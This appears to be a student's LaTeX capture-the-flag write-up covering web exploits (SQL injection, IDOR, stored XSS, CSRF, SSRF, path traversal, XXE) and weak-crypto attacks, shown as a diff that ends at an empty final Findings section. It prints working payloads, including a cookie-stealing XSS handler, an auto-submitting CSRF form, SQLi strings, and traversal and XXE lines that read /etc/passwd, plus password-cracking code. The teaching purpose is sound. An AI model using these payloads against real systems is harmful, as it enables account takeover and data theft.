+\noindent Two custom, non-standard response headers carried the flag in two halves:
+
+\begin{verbatim}
+X-Token-Alpha: IIK3100{HTTP_H34d
+X-Token-Beta:  3rs_T3ll_S3cr3ts}
+\end{verbatim}
+
+\noindent Concatenating the two values gives the complete flag, which reads ``HTTP Headers Tell Secrets''. (These headers are only sent on the unlocked version of the site on port 4002; on the sequential version on port 4001 challenge 3 is still locked.)
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{IIK3100\{HTTP\_H34d3rs\_T3ll\_S3cr3ts\}}
+\end{quote}
+
+\subsection{Authentication Bypass}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This was the fourth web challenge on the same server (\texttt{/challenge/4}). Access was gated by a login form backed by a relational database, and the query logic could be manipulated. The schema had an \texttt{accounts} table and a \texttt{privileges} table with an \texttt{access\_tier} column; the known accounts \texttt{charlie} and \texttt{diana} were \texttt{guest}, and one hidden account had tier \texttt{root}. The objective was to log in as that \texttt{root} account.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The portal helpfully echoed back the SQL query it executed, which showed that the username and password are inserted directly into the query string without sanitisation:
+
+\begin{verbatim}
+SELECT a.id, a.username, p.access_tier
+FROM accounts a
+LEFT JOIN privileges p ON p.account_id = a.id
+WHERE a.username='<input>' AND a.password='<input>'
+\end{verbatim}
+
+\noindent Because the input is concatenated straight into the query, it is vulnerable to SQL injection. Rather than guessing the root account's name or password, the \texttt{WHERE} clause itself can be rewritten to select the row by its privilege tier. The following value was entered into the \textbf{username} field:
+
+\begin{verbatim}
+' OR p.access_tier='root'-- -
+\end{verbatim}
+
+\noindent The leading quote closes the \texttt{username} string, \texttt{OR p.access\_tier='root'} makes the condition match whichever account has the \texttt{root} tier, and \texttt{-- -} comments out the rest of the query (including the password check). The password field can be anything.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent With that input, the executed query became:
+
+\begin{verbatim}
+... WHERE a.username='' OR p.access_tier='root'-- -' AND a.password='x'
+\end{verbatim}
+
+\noindent This returned the hidden root account (\texttt{id 1}, username \texttt{admin}, \texttt{access\_tier root}), and the portal granted ROOT ACCESS and revealed the flag, as seen in the figure below:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.75\linewidth]{media/auth_bypass_result.png}
+    \caption{The injection returns the root account and the portal reveals the flag}
+    \label{fig:auth-bypass-result}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{IIK3100\{SQL\_1nj3ct10n\_Byp4ss\_L0g1c\}}
+\end{quote}
+
+\subsection{Object Traversal (IDOR)}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This was a web challenge served from a dedicated container (\url{http://challenges.iik3100-h26.iaas.iik.ntnu.no:10001/}). The objective was to read the \texttt{secret} field from the admin's profile by exploiting an \textbf{Insecure Direct Object Reference (IDOR)} in the endpoint \texttt{/ch2/api/profile/<id>}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The profile endpoint returns a user's profile by its numeric \texttt{id}. The flaw is that it only checks that \emph{a} user is logged in --- it never checks that the requested profile \emph{belongs to} that user. So any authenticated account can read any other account's profile just by changing the \texttt{id} in the URL.
+
+\noindent The steps were:
+\begin{itemize}[leftmargin=2.2em]
+    \item Register an ordinary account on the site and log in (this provides the session cookie the endpoint requires). Without a session, requests to \texttt{/ch2/api/profile/<id>} are redirected to \texttt{/login} (HTTP 302).
+    \item While logged in as that low-privilege account, request the profiles by id: \texttt{/ch2/api/profile/0}, \texttt{/1}, \texttt{/2}, \ldots
+\end{itemize}
+
+\noindent Enumerating the ids showed that id 0 returns \texttt{not found}, while id 1 is the administrator. The administrator's profile (\texttt{role 1}) includes a \texttt{secret} field containing the flag, even though the request was made from an unrelated account:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.85\linewidth]{media/idor_admin_profile.png}
+    \caption{Admin profile (\texttt{id 1}) read through the IDOR, exposing the \texttt{secret} field}
+    \label{fig:idor-admin}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The endpoint leaks other users' \texttt{secret} fields (the newly registered account's own profile had no such field, but admin, alice, bob and charlie all did). Requesting \texttt{id 1} returned the admin profile with \texttt{username} \texttt{admin} and the flag in its \texttt{secret}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{FLAG\{1d0r\_pr0f1l3\_trav3rs4l\_d3b8304e\}}
+\end{quote}
+
+\subsection{Session Analysis}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Status}
+\end{itemize}
+\noindent \textbf{Not attempted.} This challenge was attempted but not completed. The task was to forge the \texttt{ctf\_token} cookie for the admin account. The token proved to be a deterministic, keyed value (not a plain hash of the username or id), so forging it would require recovering the server's secret key, which was not achieved.
+
+\subsection{Script Injection (Stored XSS)}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This web challenge featured a message board at \texttt{/ch3} where a \emph{moderator bot} automatically reads every new post while holding a privileged cookie. The objective was to post a message containing a \textbf{stored Cross-Site Scripting (XSS)} payload that exfiltrates the bot's cookie to \texttt{/ch3/collect}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The board stores each post as \textbf{raw HTML} and renders it back to every viewer without sanitisation, which is a stored XSS vulnerability: any script in a post runs in the browser of whoever views the board --- including the moderator bot. The plan was to post a payload that reads the bot's \texttt{document.cookie} and sends it to the collection endpoint \texttt{/ch3/collect?data=<cookie>}.
+
+\noindent The payload used was an image tag with an \texttt{onerror} handler (reliable even when the markup is inserted via \texttt{innerHTML}, where a bare \texttt{<script>} tag would not execute):
+
+\begin{footnotesize}
+\begin{verbatim}
+<img src=x onerror="new Image().src=
+   '/ch3/collect?data='+encodeURIComponent(document.cookie)">
+\end{verbatim}
+\end{footnotesize}
+
+\noindent When the deliberately broken image (\texttt{src=x}) fails to load, the \texttt{onerror} handler fires, builds a request to \texttt{/ch3/collect} with the viewer's cookie appended, and sends it by setting a new image's \texttt{src}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent After posting the payload, the moderator bot read the board, its browser executed the \texttt{onerror} handler, and its privileged cookie was sent to \texttt{/ch3/collect}. Once the server received the bot's cookie, it revealed the flag in a green box on the board page, as seen in the figure below:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\linewidth]{media/xss_board_flag.png}
+    \caption{The stored XSS payload on the board and the flag revealed after the bot's cookie was collected}
+    \label{fig:xss-board}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{FLAG\{x55\_c00k13\_st0l3n\_9c9fb22b\}}
+\end{quote}
+
+\subsection{Request Forgery (CSRF)}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This web challenge involved a privileged action at \texttt{/ch4/action}. The objective was to craft an HTML page that auto-submits a POST request to \texttt{/ch4/action} with \texttt{cmd=grant\_flag\&target=<username>}. The raw HTML is submitted to the site, an \emph{admin bot} ``visits'' it, and the forged request is triggered with the admin's privileges --- a \textbf{Cross-Site Request Forgery (CSRF)}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The \texttt{/ch4/action} endpoint performs a state-changing action (\texttt{grant\_flag}) based only on the session cookie, with no anti-CSRF token. Because the admin bot is logged in, any page it visits can silently submit a form to that endpoint on its behalf. The crafted page contains a hidden form, pre-filled with \texttt{cmd=grant\_flag} and \texttt{target} set to my own username, and a small script that submits it automatically:
+
+\begin{footnotesize}
+\begin{verbatim}
+<html><body>
+<form id="x" action="http://localhost:5000/ch4/action" method="POST">
+  <input name="cmd"    value="grant_flag">
+  <input name="target" value="etiskgreier">
+</form>
+<script>document.getElementById("x").submit();</script>
+</body></html>
+\end{verbatim}
+\end{footnotesize}
+
+\noindent The form's \texttt{action} points at \texttt{http://localhost:5000/ch4/action}, which is how the application is addressed from the bot's own browser (it runs locally on the server). The \texttt{target} is set to the attacker's username so the flag is granted to that account. This raw HTML was pasted into the submission box on \texttt{/ch4}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent When the admin bot rendered the page, the script auto-submitted the form, sending the \texttt{grant\_flag} request with the admin's session. The admin action log recorded \texttt{grant\_flag to etiskgreier}, and the flag was granted to the account and shown on the page:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\linewidth]{media/csrf_grant_flag.png}
+    \caption{The CSRF payload, the admin action log showing \texttt{grant\_flag}, and the revealed flag}
+    \label{fig:csrf-grant}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{FLAG\{csrf\_4ct10n\_forg3d\_e5d72f35\}}
+\end{quote}
+
+\subsection{SQL Injection}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This challenge (on a separate container) presented a ``ShopDB'' product search backed by a relational database. The database contained a \texttt{users} table and a \texttt{products} table, and the flag was stored in the \texttt{password} column of the \texttt{users} table for the \texttt{admin} user. The flag format was \texttt{CTF\{...\}}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The search box queries an API (\texttt{/api/sqli/search?q=...}) which conveniently echoes the SQL statement it runs. A normal search for \texttt{Widget} showed that the user input is concatenated directly into the query:
+
+\begin{footnotesize}
+\begin{verbatim}
+SELECT id, name, price FROM products WHERE name LIKE '%Widget%'
+\end{verbatim}
+\end{footnotesize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\linewidth]{media/sqli_baseline.png}
+    \caption{Baseline search, showing the unsanitised query the injection is built from}
+    \label{fig:sqli-baseline}
+\end{figure}
+
+\noindent Because the input is placed straight inside the \texttt{LIKE} string, it is injectable (the backend is SQLite). The number of columns was determined with \texttt{ORDER BY}: \texttt{ORDER BY 3} worked but \texttt{ORDER BY 4} returned ``out of range -- should be between 1 and 3'', confirming \textbf{3 columns} (\texttt{id, name, price}).
+
+\noindent A \texttt{UNION SELECT} with three columns was then used to append rows from the \texttt{users} table into the same result set, mapping \texttt{username} to the \texttt{name} field and \texttt{password} to the \texttt{price} field. The payload entered in the search box was:
+
+\begin{footnotesize}
+\begin{verbatim}
+x' UNION SELECT id, username, password FROM users-- -
+\end{verbatim}
+\end{footnotesize}
+
+\noindent Here \texttt{x'} closes the string literal, \texttt{UNION SELECT \ldots} adds the users' rows, and \texttt{-- -} comments out the trailing \texttt{\%'} from the original query.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The injection returned every user's credentials. The \texttt{admin} user's password is the flag:
+
+\begin{footnotesize}
+\begin{verbatim}
+{id:1, name:"alice", price:"s3cr3t_al1ce"}
+{id:2, name:"bob",   price:"b0b_p4ss"}
+{id:3, name:"admin", price:"CTF{uni0n_b4s3d_sqli_f0r_the_win}"}
+\end{verbatim}
+\end{footnotesize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\linewidth]{media/sqli_union.png}
+    \caption{The UNION injection returning the users table; the admin password is the flag}
+    \label{fig:sqli-union}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{CTF\{uni0n\_b4s3d\_sqli\_f0r\_the\_win\}}
+\end{quote}
+
+\subsection{Server-Side Request Forgery (SSRF)}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This challenge (on the same container) offered a ``URL Preview Service'' that fetches a URL on the server's behalf and shows the content. The hint stated that an internal service runs somewhere on \texttt{localhost} that is not exposed to the internet. The objective was to use this \textbf{Server-Side Request Forgery (SSRF)} to reach that internal service and read its flag. The flag format was \texttt{CTF\{...\}}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The search box sends a \texttt{POST} to \texttt{/api/ssrf/fetch} with a JSON body \texttt{\{"url": "..."\}}, and the server fetches that URL. Arriving at the exact internal URL \url{http://127.0.0.1:5001/internal/secret} was not a single guess --- it came from three steps, two of which were enumeration:
+
+\noindent \textbf{1. Host.} The challenge dictates the host: the service is on \texttt{localhost}. Because the server makes the request itself, \texttt{127.0.0.1} refers to the server. External URLs were refused with \emph{``External fetch attempted \ldots (blocked in sandbox)''}, so the loopback address was the only viable target.
+
+\noindent \textbf{2. Port --- found by scanning through the SSRF.} The server was asked to fetch the loopback address on a range of common ports (port 80, 3000, 5000, 5001, 8000, 8080, 9000, and so on). The responses fell into two groups, and one port stood out:
+
+\begin{footnotesize}
+\begin{verbatim}
+127.0.0.1:5000  -> External fetch attempted ... (blocked in sandbox)
+127.0.0.1:8080  -> External fetch attempted ... (blocked in sandbox)
+127.0.0.1:5001  -> Internal service: path not found (/)      <-- different!
+\end{verbatim}
+\end{footnotesize}
+
+\noindent Only \texttt{5001} answered as a live internal service rather than being sandbox-blocked, so that is the hidden service. A broader sweep of 5000--9999 confirmed it was the only one.
+
+\noindent \textbf{3. Path --- found by brute-forcing.} The service returned \texttt{path not found (<path>)} for every request, so a wordlist of likely endpoint names and combinations was tried (\texttt{/flag}, \texttt{/admin}, \texttt{/secret}, \texttt{/internal}, \texttt{/internal/secret}, \ldots). The path \texttt{/internal/secret} was the hit.
+
+\noindent This is the natural way to exploit SSRF: the internal network is invisible, so it is mapped by probing it through the vulnerable server --- first ports, then paths.
+
+\noindent \textbf{Use of AI:} I got help from an AI assistant (Claude) to run the port and path enumeration.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent Fetching \texttt{http://127.0.0.1:5001/internal/secret} through the preview service returned the internal ``Secret Vault'' response containing the flag:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.7\linewidth]{media/ssrf_flag.png}
+    \caption{The internal Secret Vault service reached via SSRF, revealing the flag}
+    \label{fig:ssrf-flag}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{CTF\{ssrf\_int3rn4l\_s3rv1c3\_pwn3d\}}
+\end{quote}
+
+\subsection{Path Traversal}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This challenge (on the same container) was a ``CatGallery'' file server that serves images from the directory \url{/var/www/html/images/}. A hint stated there is a \texttt{.secret} file in a user directory. The objective was to use \textbf{path traversal} to escape the image directory and read that file. The flag format was \texttt{CTF\{...\}}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The gallery reads a file through \texttt{/api/path/read?file=<name>}, intended for names like \texttt{cat1.jpg}. The endpoint does not sanitise the filename, so prefixing it with enough \texttt{../} sequences walks up out of \texttt{/var/www/html/images/} to the filesystem root and lets any file be read.
+
+\noindent \textbf{Step 1 --- find the user.} To locate the ``user directory'' mentioned in the hint, \texttt{/etc/passwd} was read first:
+
+\begin{footnotesize}
+\begin{verbatim}
+file=../../../../etc/passwd
+\end{verbatim}
+\end{footnotesize}
+
+\noindent This revealed a user \texttt{ctfuser} with home directory \texttt{/home/ctfuser}:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\linewidth]{media/path_passwd.png}
+    \caption{Reading \texttt{/etc/passwd} via path traversal; \texttt{ctfuser} has home \texttt{/home/ctfuser}}
+    \label{fig:path-passwd}
+\end{figure}
+
+\noindent \textbf{Step 2 --- read the secret.} The \texttt{.secret} file in that home directory was then read:
+
+\begin{footnotesize}
+\begin{verbatim}
+file=../../../../home/ctfuser/.secret
+\end{verbatim}
+\end{footnotesize}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The file (labelled an ``SSH Key backup'') contained the flag:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.95\linewidth]{media/path_secret.png}
+    \caption{Reading \texttt{/home/ctfuser/.secret} via path traversal, revealing the flag}
+    \label{fig:path-secret}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{CTF\{d0t\_d0t\_sl4sh\_all\_th3\_w4y\}}
+\end{quote}
+
+\subsection{XXE Injection}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This challenge (on the same container) was an ``XML Profile Importer'' that accepts a user profile as XML and echoes back the parsed field values. The description noted that the parser ``supports standard XML features'' --- including \texttt{DOCTYPE} declarations and external entities. The objective was to use \textbf{XML External Entity (XXE)} injection to read a local file. The flag format was \texttt{CTF\{...\}}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Search Method}
+\end{itemize}
+\noindent The importer sends the raw XML to \texttt{/api/xxe/parse} (as \texttt{application/xml}) and returns the parsed \texttt{name} and \texttt{email} fields. Because external entities are enabled, an entity can be defined that points at a local file; when the parser expands that entity inside the \texttt{<name>} element, the file's contents are returned in the \texttt{name} field.
+
+\noindent \textbf{Step 1 --- confirm XXE with \texttt{/etc/passwd}.} The following payload defines an external entity \texttt{xxe} that reads \texttt{/etc/passwd} and places it in the \texttt{name} element:
+
+\begin{footnotesize}
+\begin{verbatim}
+<?xml version="1.0"?>
+<!DOCTYPE profile [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<profile><name>&xxe;</name><email>a@b.com</email></profile>
+\end{verbatim}
+\end{footnotesize}
+
+\noindent The response's \texttt{name} field came back containing \texttt{/etc/passwd}, confirming the injection works:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\linewidth]{media/xxe_passwd.png}
+    \caption{XXE payload reading \texttt{/etc/passwd}; its contents are returned in the \texttt{name} field}
+    \label{fig:xxe-passwd}
+\end{figure}
+
+\noindent \textbf{Step 2 --- read the flag.} Changing the entity target to \texttt{file:///flag.txt} returned the flag. (Non-existent paths came back as \texttt{[entity: file:///...]}, which is how the correct file was identified.)
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The file \texttt{/flag.txt} (marked ``TOP SECRET'') contained the flag:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\linewidth]{media/xxe_flag.png}
+    \caption{XXE payload reading \texttt{/flag.txt}, revealing the flag in the \texttt{name} field}
+    \label{fig:xxe-flag}
+\end{figure}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{CTF\{xml\_3xt3rn4l\_3nt1ty\_l34k3d\}}
+\end{quote}
+
+\subsection{Caesar's Column}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This was a classical-cryptography challenge. A message was protected with \textbf{two} classical ciphers applied in order: first a \textbf{columnar transposition} (6-letter keyword of distinct letters, unknown), then a \textbf{Caesar cipher} (shift 1--25, unknown). The encryption source and the ciphertext were given; the task was to recover the plaintext. The flag format was \texttt{NTNU\{...\}}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Analysis}
+\end{itemize}
+\noindent The two layers are reversed in the opposite order to how they were applied: first undo the Caesar shift, then undo the transposition.
+\begin{itemize}[leftmargin=2.2em]
+    \item \textbf{Caesar} has only 25 possible shifts, so all of them can be tried. The Caesar step shifts only \texttt{A--Z}; spaces and punctuation pass through unchanged.
+    \item The \textbf{columnar transposition} reads the grid's columns in the alphabetical order of the keyword's letters. A 6-letter keyword gives $6! = 720$ possible column orders. Rather than guessing the keyword, one can brute-force all 720 \emph{column orders} directly.
+\end{itemize}
+\noindent That is only $26 \times 720 = 18\,720$ combinations in total --- trivially brute-forceable. The ciphertext is 102 characters, i.e.\ 17 rows $\times$ 6 columns.
+
+\noindent The one subtlety (noted in the challenge hints): simply searching for \texttt{NTNU\{} is not enough, because swapping two columns that do not touch the flag leaves the flag readable while garbling the rest. So every candidate is \textbf{scored} by counting common English words (\texttt{THE}, \texttt{IS}, \texttt{AFTER}, \ldots), and the highest-scoring decryption is kept.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Solution Code}
+\end{itemize}
+\noindent The core is a \texttt{columnar\_decrypt()} that inverts the transposition for a given column order, plus a brute-force search over all shifts and orders:
+
+\begin{footnotesize}
+\begin{verbatim}
+def columnar_decrypt(ciphertext, order):
+    cols = len(order)
+    rows = len(ciphertext) // cols
+    chunks = [ciphertext[i*rows:(i+1)*rows] for i in range(cols)]
+    grid_cols = [None] * cols
+    for k, c in enumerate(order):     # chunk k came from original column order[k]
+        grid_cols[c] = chunks[k]
+    return "".join(grid_cols[c][r] for r in range(rows) for c in range(cols))
+
+def solve(ciphertext):
+    best = None
+    for shift in range(26):
+        unshifted = caesar(ciphertext, -shift)          # 1) undo Caesar
+        for order in permutations(range(6)):            # 2) try all 720 orders
+            plaintext = columnar_decrypt(unshifted, order)
+            score = english_score(plaintext)            # score for English
+            if best is None or score > best[0]:
+                best = (score, shift, order, plaintext)
+    return best
+\end{verbatim}
+\end{footnotesize}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent The best-scoring candidate was found with \textbf{Caesar shift 17} and \textbf{column order (0, 4, 3, 1, 2, 5)}, giving the plaintext:
+
+\begin{footnotesize}
+\begin{verbatim}
+CONGRATULATIONS AGENT. THE SECRET IS NTNU{FREQUENCY_ANALYSIS_NEVER_SLEEPS}.
+DESTROY AFTER READING.XXXX
+\end{verbatim}
+\end{footnotesize}
+
+\noindent (The trailing \texttt{XXXX} is the \texttt{X} padding added by the transposition.)
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{NTNU\{FREQUENCY\_ANALYSIS\_NEVER\_SLEEPS\}}
+\end{quote}
+
+\subsection{Rock You Like a Hash Cat}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This challenge simulated an attacker who dumped four password hashes from a database (as in the SQL-injection $\rightarrow$ hash-cracking topic). The task was to recover all four passwords. With the four cracked passwords, calling \texttt{unlock([pw1,pw2,pw3,pw4])} derives a key from them and decrypts the flag, so the passwords genuinely had to be cracked. The flag format was \texttt{NTNU\{...\}}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Analysis}
+\end{itemize}
+\noindent The four targets used fast, general-purpose hash functions with no key-stretching, which makes them cheap to brute-force:
+\begin{itemize}[leftmargin=2.2em]
+    \item Target 1: \texttt{md5}, unsalted
+    \item Target 2: \texttt{sha1}, unsalted
+    \item Target 3: \texttt{sha256}, unsalted
+    \item Target 4: \texttt{sha256}, \emph{salted} --- the public salt \texttt{ntnu\_salt\_2025\$} is prepended to the password before hashing
+\end{itemize}
+\noindent A small wordlist of common passwords was provided. Real users rarely pick a raw dictionary word; they apply predictable \textbf{mutation rules}, so each wordlist entry was expanded into candidates using: case changes (lower / UPPER / Capitalised), \textbf{leetspeak} substitutions (\texttt{a$\rightarrow$@}, \texttt{o$\rightarrow$0}, \texttt{e$\rightarrow$3}, \ldots), and appended digits / years. Each candidate was hashed with the appropriate algorithm (and salt for target 4) and compared to the target hashes.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Solution Code}
+\end{itemize}
+\noindent The mutation generator and the cracking loop:
+
+\begin{footnotesize}
+\begin{verbatim}
+LEET = {"a":"@","o":"0","e":"3","i":"1","s":"$","t":"7"}
+SUFFIXES = [""] + [str(d) for d in range(10)] + ["123","2024","2025","!", ...]
+
+def mutations(word):
+    cases = {word, word.lower(), word.upper(), word.capitalize()}
+    bases = set(cases)
+    for c in cases:
+        bases.add("".join(LEET.get(ch, ch) for ch in c))   # leetspeak
+    for base in bases:
+        for suffix in SUFFIXES:                            # appended digits/years
+            yield base + suffix
+
+def crack(targets):
+    for word in open("wordlist.txt"):
+        for candidate in mutations(word.strip()):
+            for t in targets:
+                if hash_password(t["algo"], candidate, t["salt"]) == t["hash"]:
+                    found[t["id"]] = candidate
+\end{verbatim}
+\end{footnotesize}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent All four passwords were recovered, each showing a typical weak-password pattern:
+
+\vspace{0.5em}
+\renewcommand{\arraystretch}{1.3}
+\noindent
+\begin{tabularx}{\linewidth}{|c|l|l|X|}
+\hline
+\rowcolor{lightgray}\textbf{ID} & \textbf{Algo} & \textbf{Password} & \textbf{Mutation} \\
+\hline
+1 & \texttt{md5} & \texttt{letmein} & plain dictionary word \\
+\hline
+2 & \texttt{sha1} & \texttt{Monkey123} & Capitalise + append \texttt{123} \\
+\hline
+3 & \texttt{sha256} & \texttt{Dr@g0n} & \texttt{dragon} + Capitalise + leet \texttt{a$\rightarrow$@}, \texttt{o$\rightarrow$0} \\
+\hline
+4 & \texttt{sha256}+salt & \texttt{sunshine2025} & append year \texttt{2025} \\
+\hline
+\end{tabularx}
+\vspace{0.5em}
+
+\noindent Passing these four passwords (in ID order) to \texttt{unlock()} derived the key and decrypted the flag.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{NTNU\{WEAK\_PASSWORDS\_FALL\_TO\_A\_WORDLIST\}}
+\end{quote}
+
+\subsection{Tiny Primes, Big Problems}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This challenge targeted an RSA implementation whose developer used primes that were far too small. The flag was encrypted with textbook RSA (no padding): the flag was split into 6-byte chunks (the last chunk NUL-padded to 6 bytes), and each chunk $m$ (as a big-endian integer) was encrypted as $c = m^e \bmod n$. The task was to recover the flag (\texttt{NTNU\{...\}}).
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Analysis}
+\end{itemize}
+\noindent RSA's security rests on the difficulty of factoring the modulus $n$ into its two prime factors $p$ and $q$. Here $n = 889970796180013$ is only about 50 bits, so it factors essentially instantly --- the two primes turned out to be 25-bit numbers. Once $n$ is factored, the private key follows directly from the public parameters:
+\begin{itemize}[leftmargin=2.2em]
+    \item factor $n = p \times q$ (Pollard's rho; trial division would also work for such a small $n$),
+    \item compute $\varphi(n) = (p-1)(q-1)$,
+    \item compute the private exponent $d = e^{-1} \bmod \varphi(n)$ (\texttt{pow(e, -1, phi)}),
+    \item decrypt each block with $m = c^d \bmod n$ and convert back to 6 bytes.
+\end{itemize}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Solution Code}
+\end{itemize}
+\begin{footnotesize}
+\begin{verbatim}
+p = pollard_rho(n); q = n // p          # factor the tiny modulus
+phi = (p - 1) * (q - 1)
+d = pow(e, -1, phi)                      # private exponent
+flag = b""
+for c in ciphertext:
+    m = pow(c, d, n)                     # textbook RSA decryption
+    flag += m.to_bytes(6, "big")
+flag = flag.rstrip(b"\x00")              # drop the NUL padding
+\end{verbatim}
+\end{footnotesize}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
+\noindent $n$ factored into $p = 29594171$ and $q = 30072503$, which gave the private exponent and decrypted all five blocks to the flag.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Flag}
+\end{itemize}
+\begin{quote}
+\textbf{NTNU\{SMALL\_PRIMES\_FALL\_FAST\}}
+\end{quote}
+
+\subsection{Clockwork Key}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Description}
+\end{itemize}
+\noindent This challenge involved a secret encrypted with AES-128-CBC. To ``generate a random key'' the developer seeded Python's \texttt{random} module with the current Unix timestamp. A leaked server log narrowed the encryption time to some point on 2025-10-24 (UTC). The blob was \texttt{base64(IV (16 bytes) || ciphertext)}, PKCS\#7 padded. The task was to recover the flag (\texttt{NTNU\{...\}}).
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Analysis}
+\end{itemize}
+\noindent The weakness is not AES itself but the \textbf{key generation}. A secure key needs 128 bits of entropy (about $3.4\times10^{38}$ possibilities). Here the key is fully determined by the seed, and the seed is a Unix timestamp within a single known day. A day is only $86\,400$ seconds, so there are at most $86\,400$ possible keys --- the entire keyspace can be brute-forced in moments. For each candidate seed in the window, the key is regenerated the same way the developer made it, the blob is decrypted, and success is recognised when the PKCS\#7 padding is valid and the plaintext starts with \texttt{NTNU\{}.
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Solution Code}
+\end{itemize}
+\begin{footnotesize}
+\begin{verbatim}
+for seed in range(WINDOW_START, WINDOW_END):   # every second of the day
+    key = generate_key(seed)                    # same vulnerable generator
+    try:
+        plaintext = decrypt(BLOB, key)          # AES-CBC + unpad
+    except ValueError:
+        continue                                # wrong key -> bad padding
+    if plaintext.startswith(b"NTNU{"):
+        print("seed =", seed, "flag:", plaintext.decode())
+        break
+\end{verbatim}
+\end{footnotesize}
+
+\begin{itemize}[leftmargin=1.5em]
+    \item \textbf{Findings}
+\end{itemize}
